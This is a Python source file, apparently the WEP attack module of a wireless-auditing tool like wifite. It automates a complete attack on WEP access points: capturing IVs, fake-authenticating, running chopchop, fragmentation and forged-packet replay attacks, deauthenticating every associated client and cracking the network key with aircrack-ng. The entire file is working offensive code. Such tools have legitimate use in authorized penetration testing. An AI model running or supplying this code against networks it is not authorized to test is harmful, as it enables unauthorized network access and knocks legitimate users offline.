#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay, WEPAttackType
from ..tools.aircrack import Aircrack
from ..tools.ifconfig import Ifconfig
from ..config import Configuration
from ..util.color import Color
from ..util.input import raw_input
from ..model.wep_result import CrackResultWEP

import time

class AttackWEP(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 5  # TODO: Configuration?

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
            Returns: True if attack is successful, false otherwise
        '''

        aircrack = None # Aircrack process, not started yet
        fakeauth_proc = None
        replay_file = None
        airodump_target = None

        previous_ivs = 0
        current_ivs = 0
        total_ivs = 0
        keep_ivs = Configuration.wep_keep_ivs

        # Clean up previous WEP sessions
        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        attacks_remaining = list(Configuration.wep_attacks)
        while len(attacks_remaining) > 0:
            attack_name = attacks_remaining.pop(0)
            # BIG try-catch to capture ctrl+c
            try:
                # Start Airodump process
                with Airodump(channel=self.target.channel,
                              target_bssid=self.target.bssid,
                              ivs_only=True, # Only capture IVs packets
                              skip_wps=True, # Don't check for WPS-compatibility
                              output_file_prefix='wep',
                              delete_existing_files=not keep_ivs) as airodump:

                    # Color.clear_line()
                    print('\r waiting for target to appear...')
                    airodump_target = self.wait_for_target(airodump)

                    fakeauth_proc = None
                    if self.fake_auth():
                        # We successfully authenticated!
                        # Use our interface's MAC address for the attacks.
                        client_mac = Ifconfig.get_mac(Configuration.interface)
                        # Keep us authenticated
                        fakeauth_proc = Aireplay(self.target, 'fakeauth')
                    elif len(airodump_target.clients) == 0:
                        # Failed to fakeauth, can't use our MAC.
                        # And there are no associated clients. Use one and tell the user.
                        print(' there are no associated clients')
                        print(' WARNING: many attacks will not succeed' +
                                 ' without fake-authentication or associated clients')
                        client_mac = None
                    else:
                        # Fakeauth failed, but we can re-use an existing client
                        client_mac = airodump_target.clients[0].station

                    # Convert to WEPAttackType.
                    wep_attack_type = WEPAttackType(attack_name)

                    # Start Aireplay process.
                    aireplay = Aireplay(self.target,
                                        wep_attack_type,
                                        client_mac=client_mac,
                                        replay_file=replay_file)

                    time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                    last_ivs_count = 0

                    # Loop until attack completes.

                    while True:
                        airodump_target = self.wait_for_target(airodump)

                        if client_mac is None and len(airodump_target.clients) > 0:
                            client_mac = airodump_target.clients[0].station

                        if keep_ivs and current_ivs > airodump_target.ivs:
                            # We now have less IVS than before; A new attack must have started.
                            # Track how many we have in-total.
                            previous_ivs += total_ivs
                        current_ivs = airodump_target.ivs
                        total_ivs = previous_ivs + current_ivs

                        status = '%d/%d IVs' % (total_ivs, Configuration.wep_crack_at_ivs)
                        if fakeauth_proc:
                            if fakeauth_proc and fakeauth_proc.status:
                                status += ', fakeauth'
                            else:
                                status += ', no-auth'
                        if aireplay.status is not None:
                            status += ', %s' % aireplay.status
                        Color.clear_entire_line()
                        Color.pattack('WEP', airodump_target, '%s' % attack_name, status)

                        # Check if we cracked it.
                        if aircrack and aircrack.is_cracked():
                            (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
                            bssid = airodump_target.bssid
                            if airodump_target.essid_known:
                                essid = airodump_target.essid
                            else:
                                essid = None
                            print('\n %s WEP attack successful\n' % attack_name)
                            if aireplay: aireplay.stop()
                            if fakeauth_proc: fakeauth_proc.stop()
                            self.crack_result = CrackResultWEP(self.target.bssid,
                                    self.target.essid, hex_key, ascii_key)
                            self.crack_result.dump()

                            Airodump.delete_airodump_temp_files('wep')

                            self.success = True
                            return self.success

                        if aircrack and aircrack.is_running():
                            # Aircrack is running in the background.
                            print('and cracking')

                        # Check number of IVs, crack if necessary
                        if total_ivs > Configuration.wep_crack_at_ivs:
                            if not aircrack or not aircrack.is_running():
                                # Aircrack hasn't started yet. Start it.
                                ivs_files = airodump.find_files(endswith='.ivs')
                                ivs_files.sort()
                                if len(ivs_files) > 0:
                                    if not keep_ivs:
                                        ivs_files = ivs_files[-1]  # Use most-recent .ivs file
                                    aircrack = Aircrack(ivs_files)

                            elif Configuration.wep_restart_aircrack > 0 and \
                                    aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                # Restart aircrack after X seconds
                                #print('\n aircrack ran for more than %d seconds, restarting' % Configuration.wep_restart_aircrack)
                                aircrack.stop()
                                ivs_files = airodump.find_files(endswith='.ivs')
                                ivs_files.sort()
                                if len(ivs_files) > 0:
                                    if not keep_ivs:
                                        ivs_files = ivs_files[-1]  # Use most-recent .ivs file
                                    aircrack = Aircrack(ivs_files)


                        if not aireplay.is_running():
                            # Some Aireplay attacks loop infinitely
                            if attack_name == 'chopchop' or attack_name == 'fragment':
                                # We expect these to stop once a .xor is created, or if the process failed.

                                replay_file = None

                                # Check for .xor file.
                                xor_file = Aireplay.get_xor()
                                if not xor_file:
                                    # If .xor is not there, the process failed.
                                    print('\n %s attack did not generate a .xor file' % attack_name)
                                    # XXX: For debugging
                                    print(' Command: %s' % ' '.join(aireplay.cmd))
                                    print(' Output:\n%s' % aireplay.get_output())
                                    break

                                # If .xor exists, run packetforge-ng to create .cap
                                print('\n %s attack' % attack_name +
                                        ' generated a .xor file, forging...')
                                replay_file = Aireplay.forge_packet(xor_file,
                                                                   airodump_target.bssid,
                                                                   client_mac)
                                if replay_file:
                                    print(' forged packet,' +
                                             ' replaying...')
                                    wep_attack_type = WEPAttackType('forgedreplay')
                                    attack_name = 'forgedreplay'
                                    aireplay = Aireplay(self.target,
                                                        'forgedreplay',
                                                        client_mac=client_mac,
                                                        replay_file=replay_file)
                                    time_unchanged_ivs = time.time()  # Reset unchanged IVs time (it may have taken a while to forge the packet)
                                    continue
                                else:
                                    # Failed to forge packet. drop out
                                    break
                            else:
                                print('\n aireplay-ng exited unexpectedly')
                                print(' Command: %s' % ' '.join(aireplay.cmd))
                                print(' Output:\n%s' % aireplay.get_output())
                                break # Continue to other attacks

                        # Check if IVs stopped flowing (same for > N seconds)
                        if airodump_target.ivs > last_ivs_count:
                            time_unchanged_ivs = time.time()
                        elif Configuration.wep_restart_stale_ivs > 0 and \
                             attack_name != 'chopchop' and \
                             attack_name != 'fragment':
                            stale_seconds = time.time() - time_unchanged_ivs
                            if stale_seconds > Configuration.wep_restart_stale_ivs:
                                # No new IVs within threshold, restart aireplay
                                aireplay.stop()
                                print('\n restarting aireplay after' +
                                         ' %d seconds of no new IVs'
                                             % stale_seconds)
                                aireplay = Aireplay(self.target, \
                                                    wep_attack_type, \
                                                    client_mac=client_mac, \
                                                    replay_file=replay_file)
                                time_unchanged_ivs = time.time()
                        last_ivs_count = airodump_target.ivs

                        time.sleep(1)
                        continue
                    # End of big while loop
                # End of with-airodump
            except KeyboardInterrupt:
                if fakeauth_proc: fakeauth_proc.stop()
                if len(attacks_remaining) == 0:
                    if keep_ivs:
                        Airodump.delete_airodump_temp_files('wep')

                    self.success = False
                    return self.success

                if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                    if keep_ivs:
                        Airodump.delete_airodump_temp_files('wep')

                    self.success = False
                    return self.success

            except Exception as e:
                Color.pexception(e)
                continue
            # End of big try-catch
        # End of for-each-attack-type loop

        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        self.success = False
        return self.success

    def user_wants_to_stop(self, current_attack, attacks_remaining, target):
        '''
        Ask user what attack to perform next (re-orders attacks_remaining, returns False),
        or if we should stop attacking this target (returns True).
        '''
        if target is None:
            print('')
            return True
        target_name = target.essid if target.essid_known else target.bssid

        print('\n\n Interrupted')
        print(' Next steps:')

        # Deauth clients & retry
        attack_index = 1
        print('     1: Deauth clients and retry %s attack against %s' % (current_attack, target_name))

        # Move onto a different WEP attack
        for attack_name in attacks_remaining:
            attack_index += 1
            print('     %d: Start new %s attack against %s' % (attack_index, attack_name, target_name))

        # Stop attacking entirely
        attack_index += 1
        print('     %d: Stop attacking, Move onto next target' % attack_index)
        while True:
            answer = raw_input(print(' Select an option (1-%d): ' % attack_index))
            if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
                print(' Invalid input: Must enter a number between 1-%d' % attack_index)
                continue
            answer = int(answer)
            break

        if answer == 1:
            # Deauth clients & retry
            deauth_count = 1
            Color.clear_entire_line()

            print('\r Deauthenticating *broadcast* (all clients)...')
            Aireplay.deauth(target.bssid, essid=target.essid)

            attacking_mac = Ifconfig.get_mac(Configuration.interface)
            for client in target.clients:
                if attacking_mac.lower() == client.station.lower():
                    continue  # Don't deauth ourselves.

                Color.clear_entire_line()
                print('\r Deauthenticating client %s...' % client.station)

                Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                deauth_count += 1

            Color.clear_entire_line()
            print('\r Sent %d deauths' % deauth_count)

            # Re-insert current attack to top of list of attacks remaining
            attacks_remaining.insert(0, current_attack)
            return False # Don't stop
        elif answer == attack_index:
            return True # Stop attacking
        elif answer > 1:
            # User selected specific attack: Re-order attacks based on desired next-step
            attacks_remaining.insert(0, attacks_remaining.pop(answer-2))
            return False # Don't stop


    def fake_auth(self):
        '''
        Attempts to fake-authenticate with target.
        Returns: True if successful, False is unsuccessful.
        '''
        print('\r attempting fake-authentication with %s...' % self.target.bssid)
        fakeauth = Aireplay.fakeauth(self.target, timeout=AttackWEP.fakeauth_wait)
        if fakeauth:
            print(' success')
        else:
            print(' failed')
            if Configuration.require_fakeauth:
                # Fakeauth is required, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                print(' ' +
                    'unable to fake-authenticate with target' +
                    ' (%s)' % self.target.bssid)
                print(' continuing attacks because' +
                    ' --require-fakeauth was not set')
        return fakeauth


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()
    Configuration.exit_gracefully(0)

